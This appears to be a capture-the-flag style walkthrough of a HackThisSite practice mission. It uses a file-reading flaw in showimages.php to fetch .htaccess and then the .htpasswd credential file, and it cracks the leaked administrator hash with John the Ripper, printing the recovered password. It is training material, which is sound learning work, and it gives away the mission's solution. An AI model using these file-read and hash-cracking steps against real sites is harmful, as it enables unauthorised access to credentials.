I found a directory listing on `images/`:
![[Pasted image 20260920151109.png]]
I ran gobuster against:
```
/images/admin
/
```
I found that if you call:
```
https://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htaccess
```
You get:
```html
<a href="AuthName "Administration Access"
"><img src="AuthName "Administration Access"
" width=100></a> <a href="AuthType Basic 
"><img src="AuthType Basic 
" width=100></a> <a href="AuthUserFile /www/hackthissite.org/www/missions/realistic/7/images/admin/.htpasswd
"><img src="AuthUserFile /www/hackthissite.org/www/missions/realistic/7/images/admin/.htpasswd
" width=100></a> <a href="require valid-user
"><img src="require valid-user
" width=100></a> <a href=""><img src="" width=100></a>
```
Therefore I went ahead and tried:
```
GET /missions/realistic/7/showimages.php?file=images/admin/.htpasswd
```
And I got:
```html
<a href="administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
">
  <img src="administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
  " width=100>
</a>
 <a href="">
  <img src="" width=100>
</a>
```
So I now needed to understand the format of `.htpasswd` and understand the password from it. I then managed to break it using default john without seclists:
```
administrator:shadow
```